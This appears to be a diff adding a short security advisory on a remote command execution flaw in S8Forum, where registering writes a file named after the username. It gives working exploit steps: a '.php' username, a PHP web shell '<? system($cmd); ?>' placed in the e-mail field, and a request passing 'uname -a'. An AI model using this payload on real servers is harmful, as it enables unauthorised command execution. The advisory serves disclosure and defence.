@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/6547/info
+
+S8Forum is prone to a remote command execution vulnerability.
+
+When a user registers with the forum, a file is created locally with the specified username. The contents of this file will be the data entered by the user. As a result, a malicious user could create a file with an arbitrary name and PHP (.php) extension that contains valid PHP code. The attacker may then cause this file to be executed by requesting it via HTTP. 
+
+- go to Register
+
+- insert in Username:
+any_name.php
+
+- in password : any_pasword.
+
+- in E-Mail:
+
+<? system($cmd); ?>
+
+Then request the following page:
+
+http://www.example.com/s8forumfolder/users/any_name.php?cmd=uname%20-a 
